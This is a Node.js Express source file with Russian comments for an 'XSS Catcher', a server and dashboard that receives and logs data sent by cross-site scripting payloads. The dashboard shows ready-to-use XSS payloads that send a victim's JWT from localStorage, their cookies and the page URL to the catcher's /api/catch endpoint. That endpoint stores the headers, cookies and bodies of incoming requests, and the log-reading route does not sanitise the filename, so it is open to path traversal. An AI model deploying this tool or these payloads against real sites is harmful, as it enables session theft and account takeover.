const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');

// Создаем папку для логов, если её нет
const logsDir = path.join(__dirname, 'logs');
fs.ensureDirSync(logsDir);

// Храним последние полученные данные в памяти для быстрого доступа
let lastCapturedData = [];
const MAX_CAPTURED_ITEMS = 50; // Максимальное количество хранимых элементов

const app = express();

// Middleware
app.use(cors({ origin: '*' }));
app.use(morgan('combined'));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// Добавляем статическую папку для стилей и скриптов
app.use('/static', express.static(path.join(__dirname, 'public')));

// Главная страница с панелью мониторинга
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>XSS Catcher Dashboard</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
          body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-bottom: 50px; }
          .captured-data { max-height: 500px; overflow-y: auto; }
          .payload-preview { max-height: 100px; overflow-y: auto; margin-bottom: 10px; }
          pre { background: #f8f9fa; padding: 10px; border-radius: 5px; margin: 0; }
          .example-box { background: #f8f9fa; border-left: 4px solid #dc3545; padding: 15px; margin-bottom: 15px; }
          .nav-tabs .nav-link { color: #495057; }
          .nav-tabs .nav-link.active { font-weight: bold; color: #dc3545; }
          .card { margin-bottom: 20px; border: none; box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075); }
          .card-header { background-color: #f8f9fa; font-weight: bold; }
          .badge { font-size: 0.8em; font-weight: normal; }
          .hacker-text { color: #32CD32; font-family: monospace; }
          .data-card:hover { transform: translateY(-2px); transition: all 0.2s; }
        </style>
      </head>
      <body>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-4">
          <div class="container">
            <a class="navbar-brand" href="/">
              <span class="hacker-text">XSS Catcher</span>
            </a>
            <div class="collapse navbar-collapse">
              <ul class="navbar-nav ms-auto">
                <li class="nav-item">
                  <a class="nav-link" href="/api/logs" target="_blank">API: Все логи</a>
                </li>
              </ul>
            </div>
          </div>
        </nav>
        
        <div class="container">
          <div class="row">
            <div class="col-md-12">
              <div class="card mb-4">
                <div class="card-body">
                  <h1 class="card-title">
                    <span class="hacker-text">XSS Catcher</span> Dashboard
                  </h1>
                  <p class="lead">Система мониторинга XSS-атак в реальном времени</p>
                  
                  <div class="alert alert-success">
                    <strong>Статус:</strong> Работает и ожидает поступления XSS-запросов
                  </div>
                  
                  <div class="d-flex justify-content-between align-items-center mb-3">
                    <div>
                      <h3>Последние перехваченные данные</h3>
                    </div>
                    <div>
                      <button id="refreshButton" class="btn btn-primary me-2">Обновить</button>
                      <button id="clearButton" class="btn btn-outline-danger">Очистить логи</button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          <div class="row">
            <div class="col-md-8">
              <div class="card">
                <div class="card-header">
                  Перехваченные данные
                </div>
                <div class="card-body captured-data" id="capturedDataContainer">
                  <div class="text-center py-5 text-muted" id="noDataMessage">
                    <i class="bi bi-search" style="font-size: 2rem;"></i>
                    <p class="mt-3">Ожидание данных... Попробуйте выполнить XSS-атаку.</p>
                  </div>
                  <div id="capturedDataList"></div>
                </div>
              </div>
            </div>
            
            <div class="col-md-4">
              <div class="card mb-4">
                <div class="card-header">
                  Примеры XSS-атак
                </div>
                <div class="card-body">
                  <div class="example-box">
                    <h5>Кража JWT токена</h5>
                    <pre><code>&lt;img src="x" onerror="fetch('http://localhost:3030/api/catch?token='+localStorage.getItem('jwt'))"&gt;</code></pre>
                  </div>
                  
                  <div class="example-box">
                    <h5>Комплексная кража данных</h5>
                    <pre><code>&lt;div onmouseover="fetch('http://localhost:3030/api/catch', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    jwt: localStorage.getItem('jwt'),
    cookies: document.cookie,
    url: location.href
  })
})"&gt;Наведите на меня&lt;/div&gt;</code></pre>
                  </div>
                </div>
              </div>
              
              <div class="card">
                <div class="card-header">
                  Endpoint для XSS
                </div>
                <div class="card-body">
                  <p><strong>URL для отправки данных:</strong></p>
                  <pre>http://localhost:3030/api/catch</pre>
                  
                  <p class="mt-3"><strong>Методы:</strong></p>
                  <span class="badge bg-success">GET</span>
                  <span class="badge bg-success">POST</span>
                  
                  <hr>
                  
                  <p class="small text-muted">
                    Все данные сохраняются в логи и отображаются на этой странице.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <script>
          // Функция для загрузки последних данных
          function loadData() {
            fetch('/api/captured-data')
              .then(response => response.json())
              .then(data => {
                const container = document.getElementById('capturedDataList');
                const noDataMessage = document.getElementById('noDataMessage');
                
                if (data.length === 0) {
                  noDataMessage.style.display = 'block';
                  container.innerHTML = '';
                  return;
                }
                
                noDataMessage.style.display = 'none';
                container.innerHTML = '';
                
                data.forEach((item, index) => {
                  const timestamp = new Date(item.timestamp).toLocaleString();
                  const method = item.method || 'GET';
                  const queryParams = Object.keys(item.query || {}).length > 0 
                    ? JSON.stringify(item.query, null, 2) 
                    : 'Нет';
                  
                  const bodyData = item.body && Object.keys(item.body).length > 0
                    ? JSON.stringify(item.body, null, 2)
                    : 'Нет';
                  
                  const card = document.createElement('div');
                  card.className = 'card mb-3 data-card';
                  card.innerHTML = \`
                    <div class="card-header d-flex justify-content-between align-items-center">
                      <div>
                        <span class="badge bg-\${method === 'POST' ? 'danger' : 'primary'}">\${method}</span>
                        <small class="ms-2 text-muted">\${timestamp}</small>
                      </div>
                      <div>
                        <button class="btn btn-sm btn-outline-secondary view-details-btn">Детали</button>
                      </div>
                    </div>
                    <div class="card-body">
                      <div class="row">
                        <div class="col-md-6">
                          <small class="text-muted">Query параметры:</small>
                          <div class="payload-preview">
                            <pre><code>\${queryParams}</code></pre>
                          </div>
                        </div>
                        <div class="col-md-6">
                          <small class="text-muted">Body данные:</small>
                          <div class="payload-preview">
                            <pre><code>\${bodyData}</code></pre>
                          </div>
                        </div>
                      </div>
                      <div class="details-container" style="display: none;">
                        <hr>
                        <h6>Полная информация:</h6>
                        <pre><code>\${JSON.stringify(item, null, 2)}</code></pre>
                      </div>
                    </div>
                  \`;
                  
                  container.appendChild(card);
                  
                  // Добавляем обработчик для кнопки деталей
                  const detailsBtn = card.querySelector('.view-details-btn');
                  const detailsContainer = card.querySelector('.details-container');
                  
                  detailsBtn.addEventListener('click', () => {
                    if (detailsContainer.style.display === 'none') {
                      detailsContainer.style.display = 'block';
                      detailsBtn.textContent = 'Скрыть';
                    } else {
                      detailsContainer.style.display = 'none';
                      detailsBtn.textContent = 'Детали';
                    }
                  });
                });
              })
              .catch(error => {
                console.error('Ошибка загрузки данных:', error);
              });
          }
          
          // Загружаем данные при загрузке страницы
          document.addEventListener('DOMContentLoaded', () => {
            loadData();
            
            // Настраиваем обновление каждые 5 секунд
            setInterval(loadData, 5000);
            
            // Обработчик для кнопки обновления
            document.getElementById('refreshButton').addEventListener('click', loadData);
            
            // Обработчик для кнопки очистки
            document.getElementById('clearButton').addEventListener('click', () => {
              if (confirm('Вы уверены, что хотите очистить все логи?')) {
                fetch('/api/clear-logs', { method: 'POST' })
                  .then(response => response.json())
                  .then(data => {
                    alert(data.message);
                    loadData();
                  })
                  .catch(error => {
                    console.error('Ошибка очистки логов:', error);
                  });
              }
            });
          });
        </script>
      </body>
    </html>
  `);
});

// Эндпоинт для приема XSS-запросов
app.all('/api/catch', (req, res) => {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const logFilename = `xss-${timestamp}.json`;
  const logPath = path.join(logsDir, logFilename);
  
  const logData = {
    timestamp: new Date().toISOString(),
    method: req.method,
    ip: req.ip,
    headers: req.headers,
    query: req.query,
    body: req.body,
    cookies: req.cookies
  };
  
  // Записываем в лог-файл
  fs.writeJsonSync(logPath, logData, { spaces: 2 });
  
  // Добавляем в список последних запросов
  lastCapturedData.unshift(logData);
  // Ограничиваем количество хранимых элементов
  if (lastCapturedData.length > MAX_CAPTURED_ITEMS) {
    lastCapturedData = lastCapturedData.slice(0, MAX_CAPTURED_ITEMS);
  }
  
  console.log(`[XSS] Получен запрос! Сохранен в ${logFilename}`);
  
  // Возвращаем OK
  res.status(200).json({ status: 'success', message: 'XSS data captured', filename: logFilename });
});

// API для получения последних захваченных данных
app.get('/api/captured-data', (req, res) => {
  res.json(lastCapturedData);
});

// API для очистки логов
app.post('/api/clear-logs', (req, res) => {
  try {
    const files = fs.readdirSync(logsDir);
    
    files.filter(file => file.startsWith('xss-')).forEach(file => {
      fs.unlinkSync(path.join(logsDir, file));
    });
    
    // Очищаем список последних запросов
    lastCapturedData = [];
    
    res.json({ success: true, message: 'Все логи успешно удалены' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Получение списка лог-файлов
app.get('/api/logs', (req, res) => {
  try {
    const files = fs.readdirSync(logsDir);
    const logs = files
      .filter(file => file.startsWith('xss-'))
      .map(file => ({
        filename: file,
        path: `/api/logs/${file}`,
        created: fs.statSync(path.join(logsDir, file)).birthtime
      }))
      .sort((a, b) => new Date(b.created) - new Date(a.created));
    
    res.json(logs);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Получение содержимого лог-файла
app.get('/api/logs/:filename', (req, res) => {
  try {
    const filename = req.params.filename;
    const logPath = path.join(logsDir, filename);
    
    if (!fs.existsSync(logPath)) {
      return res.status(404).json({ error: 'Log file not found' });
    }
    
    const logData = fs.readJsonSync(logPath);
    res.json(logData);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Запуск сервера
const PORT = process.env.PORT || 3030;
app.listen(PORT, () => {
  console.log(`XSS Catcher запущен на порту ${PORT}`);
  console.log(`Откройте панель мониторинга: http://localhost:${PORT}`);
}); 